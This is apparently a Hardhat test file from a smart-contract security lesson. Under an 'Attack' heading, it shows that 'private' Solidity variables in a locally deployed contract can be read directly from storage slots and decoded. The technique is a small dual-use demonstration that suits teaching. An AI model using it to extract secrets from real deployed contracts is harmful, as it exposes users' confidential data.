const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Private Variables", () => {
  let secretData;

  beforeEach(async () => {
    let SecretData = await ethers.getContractFactory("SecretData");
    secretData = await SecretData.deploy();
  });

  async function getShortStr(slot, contractAddress) {
    const paddedSlot = ethers.utils.hexZeroPad(slot, 32);
    const storageLocation = await ethers.provider.getStorageAt(
      contractAddress,
      paddedSlot
    );
    const storageValue = ethers.BigNumber.from(storageLocation);

    const stringData = ethers.utils.toUtf8String(
      storageValue.and(ethers.constants.MaxUint256.sub(255)).toHexString()
    );
    return stringData.replace(/\x00/g, "");
  }

  describe("Attack", () => {
    it("Read private and public data in the contract", async () => {
      let paddedSlot = ethers.utils.hexZeroPad(0, 32);
      let data = await ethers.provider.getStorageAt(
        secretData.address,
        paddedSlot
      );
      expect(ethers.BigNumber.from(data)).to.be.equal(123);

      paddedSlot = ethers.utils.hexZeroPad(1, 32);
      data = await ethers.provider.getStorageAt(secretData.address, paddedSlot);
      expect(ethers.BigNumber.from(data)).to.be.equal(324);

      expect(await getShortStr(2, secretData.address)).to.be.equal(
        "Secret data"
      );
      expect(await getShortStr(3, secretData.address)).to.be.equal(
        "Secret data1"
      );

      paddedSlot = ethers.utils.hexZeroPad(4, 32);
      data = await ethers.provider.getStorageAt(secretData.address, paddedSlot);
      expect(
        parseInt(ethers.BigNumber.from(data.slice(60, 64)), 16)
      ).to.be.equal(100);

      paddedSlot = ethers.utils.hexZeroPad(4, 32);
      data = await ethers.provider.getStorageAt(secretData.address, paddedSlot);
      expect(
        parseInt(ethers.BigNumber.from(data.slice(64, 68)), 16)
      ).to.be.equal(1);
    });
  });
});
